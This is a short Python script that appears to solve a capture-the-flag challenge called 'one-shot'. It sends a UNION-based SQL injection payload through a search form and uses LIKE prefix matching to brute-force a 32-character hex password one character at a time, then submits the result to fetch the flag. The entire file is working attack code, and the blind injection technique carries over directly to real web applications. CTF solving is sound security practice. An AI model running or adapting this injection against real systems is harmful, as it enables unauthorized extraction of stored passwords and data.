import requests
import re 
from tqdm import tqdm
def new_session():
    return re.search('name="id" value="([1234567890abcdef]{16})"', requests.post('http://one-shot.amt.rs/new_session').text).group(1)
id=new_session()
def check(prefix):
    tmp = new_session()
    res = re.findall('<li>[1234567890abcdef][\*]{31}<\/li>', requests.post('http://one-shot.amt.rs/search', data={'id': tmp, 'query': f"%' union select password from table_{id} where password like '{prefix}%' or '!'='"}).text) 
    #print(res)
    return len(res) == 2 
charset = '1234567890abcdef'
curr = ''
for i in tqdm(range(32)):
    for c in tqdm(charset, leave=False):
        if check(curr+c):
            curr += c 
            break 
print('id:', id)
print('curr:', curr)
print('flag:', requests.post('http://one-shot.amt.rs/guess', data={'id': id, 'password': curr}).text)




